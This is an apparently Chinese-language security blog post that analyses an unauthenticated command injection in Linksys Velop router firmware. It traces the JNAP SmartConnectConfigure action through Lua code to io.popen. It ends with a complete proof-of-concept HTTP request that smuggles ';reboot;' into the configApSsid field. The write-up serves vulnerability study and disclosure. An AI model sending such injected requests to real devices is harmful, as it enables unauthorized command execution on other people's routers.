@@ -1,0 +1,525 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.8.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"21guns.top","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="[TOC] Linksys velop无需认证的命令注入漏洞 下载文章中的固件版本 1.1.2.185309：https://noexit.tv/linksys-velop-firmware-versions-with-download/ 通过JNAP的action，有个命令注入，可RCE，无需认证 JNAP是思科的web服务协议，类似于HNAP 通过X-JNAP-Action请求头来执行JNAP">
+<meta name="keywords" content="路由器,漏洞分析,命令注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linksys velop无需认证的命令注入漏洞">
+<meta property="og:url" content="http://21guns.top/2021/10/21/iot/Linksys velop无需认证的命令注入漏洞/index.html">
+<meta property="og:site_name" content="have a nice day">
+<meta property="og:description" content="[TOC] Linksys velop无需认证的命令注入漏洞 下载文章中的固件版本 1.1.2.185309：https://noexit.tv/linksys-velop-firmware-versions-with-download/ 通过JNAP的action，有个命令注入，可RCE，无需认证 JNAP是思科的web服务协议，类似于HNAP 通过X-JNAP-Action请求头来执行JNAP">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2022-02-21T07:20:40.845Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Linksys velop无需认证的命令注入漏洞">
+<meta name="twitter:description" content="[TOC] Linksys velop无需认证的命令注入漏洞 下载文章中的固件版本 1.1.2.185309：https://noexit.tv/linksys-velop-firmware-versions-with-download/ 通过JNAP的action，有个命令注入，可RCE，无需认证 JNAP是思科的web服务协议，类似于HNAP 通过X-JNAP-Action请求头来执行JNAP">
+
+<link rel="canonical" href="http://21guns.top/2021/10/21/iot/Linksys velop无需认证的命令注入漏洞/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Linksys velop无需认证的命令注入漏洞 | have a nice day</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">have a nice day</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://21guns.top/2021/10/21/iot/Linksys velop无需认证的命令注入漏洞/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="21Guns">
+      <meta itemprop="description" content>
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="have a nice day">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Linksys velop无需认证的命令注入漏洞
+        </h1>
+
+        <div class="post-meta">
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-10-21 09:23:44" itemprop="dateCreated datePublished" datetime="2021-10-21T09:23:44+08:00">2021-10-21</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-02-21 15:20:40" itemprop="dateModified" datetime="2022-02-21T15:20:40+08:00">2022-02-21</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/IOT安全/" itemprop="url" rel="index"><span itemprop="name">IOT安全</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>[TOC]</p>
+<h2 id="Linksys-velop无需认证的命令注入漏洞"><a href="#Linksys-velop无需认证的命令注入漏洞" class="headerlink" title="Linksys velop无需认证的命令注入漏洞"></a>Linksys velop无需认证的命令注入漏洞</h2><ol>
+<li>下载文章中的固件版本 1.1.2.185309：<a href="https://noexit.tv/linksys-velop-firmware-versions-with-download/" target="_blank" rel="noopener">https://noexit.tv/linksys-velop-firmware-versions-with-download/</a></li>
+<li>通过JNAP的action，有个命令注入，可RCE，无需认证</li>
+<li>JNAP是思科的web服务协议，类似于HNAP</li>
+<li>通过X-JNAP-Action请求头来执行JNAP的action</li>
+</ol>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 请求/JNAP</span></span><br><span class="line">POST /JNAP/ HTTP/1.1</span><br><span class="line"><span class="comment"># 指定action</span></span><br><span class="line">X-JNAP-Action: http://linksys.com/jnap/nodes/smartconnect/SmartConnectConfigure</span><br><span class="line"><span class="comment"># 指定action的参数    </span></span><br><span class="line">&#123;<span class="string">"configApSsid"</span>:<span class="string">"ssid"</span>,<span class="string">"configApPassphrase"</span>:<span class="string">"wifipass"</span>,<span class="string">"srpLogin"</span>:<span class="string">"user"</span>,<span class="string">"srpPassword"</span>:<span class="string">"password"</span>&#125;</span><br></pre></td></tr></table></figure>
+<ol start="4">
+<li>官网不提供以往固件，自行Google老固件<a href="https://noexit.tv/linksys-velop-firmware-versions-with-download/" target="_blank" rel="noopener">https://noexit.tv/linksys-velop-firmware-versions-with-download/</a></li>
+</ol>
+<h3 id="提取文件系统"><a href="#提取文件系统" class="headerlink" title="提取文件系统"></a>提取文件系统</h3><blockquote>
+<p>提取WHW03固件的文件系统</p>
+</blockquote>
+<ol>
+<li>固件：<a href="https://www.linksys.com/us/support-article/?articleNum=207568（没有历史固件，只有最新Ver" target="_blank" rel="noopener">https://www.linksys.com/us/support-article/?articleNum=207568（没有历史固件，只有最新Ver</a>. 2.1.13.200506和较新Ver. 1.1.13.200506，先凑活用较新</li>
+<li>直接binwalk -e，总是提示“No space left on device”</li>
+<li>binwalk查看信息，发现Linux ext文件系统，偏移0x800000（不同的binwalk版本结果不同，较新版本在前面还会有dtb信息，算是一个标志，但旧版本也不影响，知道即可</li>
+</ol>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 较新版本在此有dtb标志</span></span><br><span class="line">14119         0x3727          xz compressed data</span><br><span class="line">14340         0x3804          xz compressed data</span><br><span class="line"><span class="comment"># 较新版本在此有dtb标志</span></span><br><span class="line">8388608       0x800000        Linux EXT filesystem, rev 0.0, ext4 filesystem data, UUID=4fae4919-9df2-4368-9241-cb6b47494749</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>winhex中将0x800000到最后，复制到一个新文件：右键、选块起始位置、选块尾部、编辑、复制到新文件（dd也可，能图形就图形的，简单</li>
+<li>直接7zip打开压缩包即可看到文件系统（实测其他压缩软件不可</li>
+</ol>
+<h3 id="下载历史固件"><a href="#下载历史固件" class="headerlink" title="下载历史固件"></a>下载历史固件</h3><ul>
+<li>googol到的：<a href="https://noexit.tv/linksys-velop-firmware-versions-with-download/" target="_blank" rel="noopener">https://noexit.tv/linksys-velop-firmware-versions-with-download/</a></li>
+<li>同上所讲，binwalk也是偏移0x800000</li>
+</ul>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">lxl@ubuntu:~/Desktop/tmp$ binwalk FW_WHW03_1.1.2.185309_prod.img </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">14119         0x3727          xz compressed data</span><br><span class="line">14340         0x3804          xz compressed data</span><br><span class="line">8388608       0x800000        Linux EXT filesystem, rev 0.0, ext4 filesystem data, UUID=927b8106-610e-4cc1-943f-ee1062d562d5</span><br></pre></td></tr></table></figure>
+<h3 id="找漏洞点"><a href="#找漏洞点" class="headerlink" title="找漏洞点"></a>找漏洞点</h3><ol>
+<li>根据action找到对应lua文件：JNAP\modules\smartconnect_server.lua</li>
+</ol>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1 触发漏洞的action</span></span><br><span class="line">X-JNAP-Action: http://linksys.com/jnap/nodes/smartconnect/SmartConnectConfigure</span><br><span class="line"><span class="comment"># 2 \filestem-dir\JNAP目录下搜索action字符串“SmartConnectConfigure”</span></span><br><span class="line"><span class="comment"># 3 共找到3个文件，且匹配到的内容都是一样的，观察3个文件所在目录，选择通用的JNAP\modules\smartconnect_server.lua</span></span><br><span class="line">\filesystem-dir\JNAP\modules\lan\smartconnect_server.lua （匹配4次）</span><br><span class="line">\filesystem-dir\JNAP\modules\smartconnect_server.lua （匹配4次）</span><br><span class="line">\filesystem-dir\JNAP\modules\wan\smartconnect_server.lua （匹配4次）</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>找到对应的函数：SmartConnectConfigure</li>
+</ol>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># JNAP\modules\smartconnect_server.lua</span></span><br><span class="line"><span class="built_in">return</span> require(<span class="string">'libhdklua'</span>).loadmodule(<span class="string">'jnap_smartconnect'</span>), &#123;</span><br><span class="line">    [<span class="string">'http://linksys.com/jnap/nodes/smartconnect/SmartConnectConfigure'</span>] = SmartConnectConfigure,</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>继续调用函数：smartconnect库中的smartConnectConfigure</li>
+</ol>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># JNAP\modules\smartconnect_server.lua</span></span><br><span class="line"><span class="built_in">local</span> <span class="keyword">function</span> SmartConnectConfigure(ctx, input)</span><br><span class="line">    <span class="built_in">local</span> smc = require(<span class="string">'smartconnect'</span>)<span class="comment"># 导入库文件</span></span><br><span class="line">    <span class="built_in">local</span> sc = ctx:sysctx()</span><br><span class="line">    <span class="built_in">local</span> error, output = smc.smartConnectConfigure(sc, input)<span class="comment"># 调用库中的函数，input参数传入</span></span><br><span class="line">    <span class="built_in">return</span> error or <span class="string">'OK'</span></span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目录中搜索smartconnect，找到usr\local\lib\lua\5.1\smartconnect.lua，并得到库文件所在目录</span></span><br></pre></td></tr></table></figure>
+<ol start="4">
+<li>继续调用函数：bluetooth中的btSmartConnectConfigure（怎么保证mode是2呢？</li>
+</ol>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># usr\local\lib\lua\5.1\smartconnect.lua</span></span><br><span class="line"><span class="keyword">function</span> _M.smartConnectConfigure(sc, input)</span><br><span class="line">    <span class="built_in">local</span> smart_mode = sc:get_smartmode()</span><br><span class="line">    <span class="keyword">if</span> smart_mode == 2 <span class="keyword">then</span></span><br><span class="line">        <span class="comment">## If a device is Master node.</span></span><br><span class="line">        <span class="built_in">local</span> error, output = bluetooth.btSmartConnectConfigure(input.configApSsid, input.configApPassphrase, input.srpLogin, input.srpPassword)<span class="comment">## 继续调用，并传入input</span></span><br><span class="line">    end</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
+<ol start="5">
+<li>继续调用函数：本文件中的_M.btRunCentralCommandSync</li>
+</ol>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># \usr\local\lib\lua\5.1\bluetooth.lua</span></span><br><span class="line"><span class="keyword">function</span> _M.btSmartConnectConfigure(configap, configpass, srplogin, srppass)</span><br><span class="line">    <span class="built_in">local</span> opt = <span class="string">'-f '</span>..<span class="string">'-A '</span>..configap..<span class="string">'-P '</span>..configpass..<span class="string">'-L '</span>..srplogin..<span class="string">'-R '</span>..srppass</span><br><span class="line">    <span class="built_in">local</span> error, output = _M.btRunCentralCommandSync(opt)<span class="comment"># 继续调用，传入input构建的opt</span></span><br><span class="line">end</span><br></pre></td></tr></table></figure>
+<ol start="6">
+<li>最终调用popen函数（常见的命令注入函数</li>
+</ol>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># \usr\local\lib\lua\5.1\bluetooth.lua</span></span><br><span class="line">_M.RUN_CENTRAL_CMD_SYNC = <span class="string">'/usr/bin/btsetup_central %s'</span><span class="comment"># 宏定义</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> _M.btRunCentralCommandSync(option)</span><br><span class="line">    assert(option)</span><br><span class="line">    <span class="built_in">local</span> file = io.popen(_M.RUN_CENTRAL_CMD_SYNC:format(option))<span class="comment"># 字符串拼接：宏 + 用户可控的opt</span></span><br><span class="line">end</span><br></pre></td></tr></table></figure>
+<h3 id="poc-漏洞触发"><a href="#poc-漏洞触发" class="headerlink" title="poc+漏洞触发"></a>poc+漏洞触发</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1 poc</span></span><br><span class="line">POST /JNAP/ HTTP/1.1<span class="comment"># 请求/JNAP</span></span><br><span class="line">Host: 10.158.1.1</span><br><span class="line">Accept: application/json; charset=UTF-8</span><br><span class="line">Expires: Fri, 10 Oct 2015 14:19:41 GMT</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-Hans-CN;q=1, en-CN;q=0.9</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Content-Type: application/json; charset=UTF-8</span><br><span class="line">Content-Length: 135</span><br><span class="line">User-Agent: Linksys/2.5.2 (iPhone; iOS 11.2.6; Scale/3.00)</span><br><span class="line">Connection: close</span><br><span class="line">X-JNAP-Action: http://linksys.com/jnap/nodes/smartconnect/SmartConnectConfigure<span class="comment"># 指定action</span></span><br><span class="line">    </span><br><span class="line">&#123;<span class="string">"configApSsid"</span>:<span class="string">"testssid;reboot;"</span>,<span class="string">"configApPassphrase"</span>:<span class="string">"testwifipass"</span>,<span class="string">"srpLogin"</span>:<span class="string">"testlogin"</span>,<span class="string">"srpPassword"</span>:<span class="string">"testpass"</span>&#125;<span class="comment"># 指定action的参数  </span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># 2 input</span></span><br><span class="line">&#123;<span class="string">"configApSsid"</span>:<span class="string">"testssid;reboot;"</span>,<span class="string">"configApPassphrase"</span>:<span class="string">"testwifipass"</span>,<span class="string">"srpLogin"</span>:<span class="string">"testlogin"</span>,<span class="string">"srpPassword"</span>:<span class="string">"testpass"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3 拼接opt字符串</span></span><br><span class="line"><span class="built_in">local</span> opt = <span class="string">'-f '</span>..<span class="string">'-A '</span>..configap..<span class="string">'-P '</span>..configpass..<span class="string">'-L '</span>..srplogin..<span class="string">'-R '</span>..srppass</span><br><span class="line"><span class="built_in">local</span> opt = <span class="string">'-f '</span>..<span class="string">'-A '</span>..<span class="string">"testssid;reboot;"</span>..<span class="string">'-P '</span>..<span class="string">"testwifipass"</span>..<span class="string">'-L '</span>..<span class="string">"testlogin"</span>..<span class="string">'-R '</span>..<span class="string">"testpass"</span></span><br><span class="line"><span class="built_in">local</span> opt = <span class="string">'-f -A testssid;reboot;-P testwifipass-L testlogin-R testpass"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 4 拼接popen的cmd字符串</span></span><br><span class="line"><span class="string">opt = '</span>-f -A testssid;reboot;-P testwifipass-L testlogin-R testpass<span class="string">"</span></span><br><span class="line"><span class="string">_M.RUN_CENTRAL_CMD_SYNC = '/usr/bin/btsetup_central %s'</span></span><br><span class="line"><span class="string">io.popen(_M.RUN_CENTRAL_CMD_SYNC:format(option))</span></span><br><span class="line"><span class="string">io.popen('/usr/bin/btsetup_central %s':format('-f -A testssid;reboot;-P testwifipass-L testlogin-R testpass"</span>))</span><br><span class="line">io.popen(<span class="string">'/usr/bin/btsetup_central -f -A testssid;reboot;-P testwifipass-L testlogin-R testpass'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5 分号截断了命令，执行完btsetup_central又执行了用户可控的reboot命令</span></span><br><span class="line">/usr/bin/btsetup_central -f -A testssid;reboot;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>注意：并非将opt作为参数传入btsetup_central二进制中去执行，而直接在lua中popen触发，漏洞点在lua而非elf中</li>
+</ul>
+<blockquote>
+<p>参考：<a href="https://puzzor.github.io/Linksys-Velop-configApSsid-command-injection-with-preauth" target="_blank" rel="noopener">https://puzzor.github.io/Linksys-Velop-configApSsid-command-injection-with-preauth</a></p>
+</blockquote>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>21Guns
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://21guns.top/2021/10/21/iot/Linksys velop无需认证的命令注入漏洞/" title="Linksys velop无需认证的命令注入漏洞">http://21guns.top/2021/10/21/iot/Linksys velop无需认证的命令注入漏洞/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/路由器-漏洞分析-命令注入/" rel="tag"># 路由器,漏洞分析,命令注入</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/10/12/iot/ARM-X对Tenda AC15的固件模拟/" rel="prev" title="ARM-X对Tenda AC15的固件模拟">
+      <i class="fa fa-chevron-left"></i> ARM-X对Tenda AC15的固件模拟
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/11/10/iot/天府杯-asus路由器漏洞分析/" rel="next" title="天府杯-asus路由器漏洞分析">
+      天府杯-asus路由器漏洞分析 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Linksys-velop无需认证的命令注入漏洞"><span class="nav-number">1.</span> <span class="nav-text">Linksys velop无需认证的命令注入漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#提取文件系统"><span class="nav-number">1.1.</span> <span class="nav-text">提取文件系统</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#下载历史固件"><span class="nav-number">1.2.</span> <span class="nav-text">下载历史固件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#找漏洞点"><span class="nav-number">1.3.</span> <span class="nav-text">找漏洞点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#poc-漏洞触发"><span class="nav-number">1.4.</span> <span class="nav-text">poc+漏洞触发</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="21Guns" src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">21Guns</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">164</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">71</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="vx:lxllxllx1" title="Wechat → vx:lxllxllx1" rel="noopener" target="_blank"><i class="fab fa-weixin fa-fw"></i>Wechat</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://github.com/21Gun5" title="GitHub → https://github.com/21Gun5" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2016 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">21Guns</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script size="300" alpha="0.5" zindex="0" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+<script src="/js/schemes/pisces.js"></script>
+<script src="/js/next-boot.js"></script>
+
+
+
+  
+
+
+
+
+  <script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
